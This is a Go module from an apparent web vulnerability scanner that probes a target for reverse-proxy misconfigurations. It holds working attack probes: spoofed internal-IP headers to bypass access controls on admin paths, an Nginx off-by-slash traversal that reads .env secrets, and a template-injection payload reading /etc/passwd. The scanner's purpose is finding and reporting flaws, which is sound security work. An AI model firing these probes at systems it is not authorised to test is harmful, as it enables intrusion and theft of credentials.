package proxy

import (
	"fmt"
	"io"
	"net/http"
	"strings"

	"github.com/yupiyy/bhyakugan/internal/core"
)

var (
	internalHeaders = map[string]string{
		"X-Forwarded-For":   "127.0.0.1",
		"X-Real-IP":        "127.0.0.1",
		"True-Client-IP":   "127.0.0.1",
		"Client-IP":        "127.0.0.1",
		"Forwarded":        "for=127.0.0.1;by=127.0.0.1",
		"X-Originating-IP": "127.0.0.1",
		"X-Remote-IP":      "127.0.0.1",
		"X-Remote-Addr":    "127.0.0.1",
		"X-Client-IP":      "127.0.0.1",
		"X-Host":           "127.0.0.1",
		"X-Forwarded-Host": "127.0.0.1",
		"X-Forwarded-Server": "127.0.0.1",
	}

	internalPaths = []string{"/admin", "/internal", "/stats", "/server-status", "/config", "/api/v1/admin"}
)

// Scan tests for Reverse Proxy Misconfigurations
func Scan(baseURL string, client *http.Client, onFound func(core.Finding)) {
	if baseURL[len(baseURL)-1] != '/' {
		baseURL += "/"
	}

	// Store grouped findings: Header -> []EndpointDetails
	bypassGroups := make(map[string][]string)
	highestSeverity := make(map[string]string) // Header -> Severity

	// 1. Header Spoofing for Internal Access
	for _, path := range internalPaths {
		target := baseURL + strings.TrimPrefix(path, "/")
		
		// First, check without headers (Base)
		respBase, err := client.Get(target)
		if err != nil {
			continue
		}
		respBase.Body.Close()

		// If Base is 403/401, try spoofing
		if respBase.StatusCode == 403 || respBase.StatusCode == 401 {
			
			for hName, hVal := range internalHeaders {
				req, _ := http.NewRequest("GET", target, nil)
				req.Header.Set(hName, hVal)
				
				resp, err := client.Do(req)
				if err != nil {
					continue
				}
				defer resp.Body.Close()

				if resp.StatusCode == 200 {
					// --- DIFF & IMPACT VERIFIER LAYER ---
					body, _ := io.ReadAll(resp.Body)
					bodyStr := string(body)
					
					currentSeverity := "Info"
					detail := fmt.Sprintf("%s (200 OK)", target)
					
					// 1. Internal Keywords Check (Strong Indicator)
					lowerBody := strings.ToLower(bodyStr)
					isSensitive := false
					if strings.Contains(lowerBody, "admin") || 
					   strings.Contains(lowerBody, "config") ||
					   strings.Contains(lowerBody, "dashboard") ||
					   strings.Contains(lowerBody, "root") {
						isSensitive = true
					}

					// 2. Diff Check (vs Generic Page)
					isDefaultPage := len(bodyStr) < 500 && (strings.Contains(bodyStr, "Welcome to") || strings.Contains(bodyStr, "It works") || strings.Contains(bodyStr, "Default Page"))

					if isSensitive && !isDefaultPage {
						currentSeverity = "Critical" // Admin/Config exposed is Critical
						detail += " [SENSITIVE CONTENT]"
					} else if isDefaultPage {
						currentSeverity = "Info"
						detail += " [DEFAULT PAGE]"
					} else {
						// Generic 200 OK on restricted endpoint
						currentSeverity = "High"
					}

					// Add to group
					bypassGroups[hName] = append(bypassGroups[hName], detail)
					
					// Update max severity for this header
					if highestSeverity[hName] == "Critical" {
						// Already max
					} else if currentSeverity == "Critical" {
						highestSeverity[hName] = "Critical"
					} else if currentSeverity == "High" && highestSeverity[hName] != "Critical" {
						highestSeverity[hName] = "High"
					} else if highestSeverity[hName] == "" {
						highestSeverity[hName] = currentSeverity
					}
				}
			}
		}
	}

	// Report Grouped Findings
	for hName, details := range bypassGroups {
		sev := highestSeverity[hName]
		if sev == "" { sev = "Info" }
		
		fmt.Printf("[!] POSITIVE MATCH: Internal Access via %s (Grouped: %d endpoints)\n", hName, len(details))
		onFound(core.Finding{
			Type:     "Improper Trust in HTTP Headers (Proxy Bypass)",
			Target:   baseURL, // Root cause is global config
			Detail:   fmt.Sprintf("The application trusts the '%s' header, allowing bypass of access controls.\nExposed Endpoints:\n- %s", hName, strings.Join(details, "\n- ")),
			Severity: sev,
		})
	}

	// 2. Nginx Off-by-slash Traversal
	// Many sites have a /static or /assets alias
	nginxPaths := []string{"static", "assets", "js", "css"}
	for _, p := range nginxPaths {
		target := baseURL + p + "../.env"
		resp, err := client.Get(target)
		if err == nil {
			defer resp.Body.Close()
			body, _ := io.ReadAll(resp.Body)
			bodyStr := string(body)

			// 3. Must NOT contain common HTML tags (to avoid error pages like CodeIgniter)
			isHTML := strings.Contains(strings.ToLower(bodyStr), "<html") || 
					  strings.Contains(strings.ToLower(bodyStr), "<!doctype") ||
					  strings.Contains(strings.ToLower(bodyStr), "<div") ||
					  strings.Contains(strings.ToLower(bodyStr), "<span") ||
					  strings.Contains(strings.ToLower(bodyStr), "<h4>")

			// 4. Must contain common .env keywords
			isEnv := strings.Contains(bodyStr, "DB_") || 
					 strings.Contains(bodyStr, "APP_") || 
					 strings.Contains(bodyStr, "SECRET") ||
					 strings.Contains(bodyStr, "PASSWORD")

			if resp.StatusCode == 200 && strings.Contains(bodyStr, "=") && !isHTML && isEnv {
				fmt.Printf("[!] POSITIVE MATCH: Nginx Alias Traversal at %s\n", target)
				onFound(core.Finding{
					Type:     "Nginx Configuration Error",
					Target:   target,
					Detail:   "Off-by-slash alias traversal leaked .env file",
					Severity: "Critical",
				})
			}
		}
	}

	// 3. Caddy/Go Template Injection in Headers
	templatePayload := `{{readFile "/etc/passwd"}}`
	req, _ := http.NewRequest("GET", baseURL, nil)
	req.Header.Set("Referer", templatePayload)
	req.Header.Set("User-Agent", templatePayload)
	
	resp, err := client.Do(req)
	if err == nil {
		defer resp.Body.Close()
		body, _ := io.ReadAll(resp.Body)
		if strings.Contains(string(body), "root:x:") {
			fmt.Printf("[!] POSITIVE MATCH: Template Injection at %s\n", baseURL)
			onFound(core.Finding{
				Type:     "Server-Side Template Injection",
				Target:   baseURL,
				Detail:   "Caddy/Go Template Injection via Headers confirmed",
				Severity: "Critical",
			})
		}
	}
}
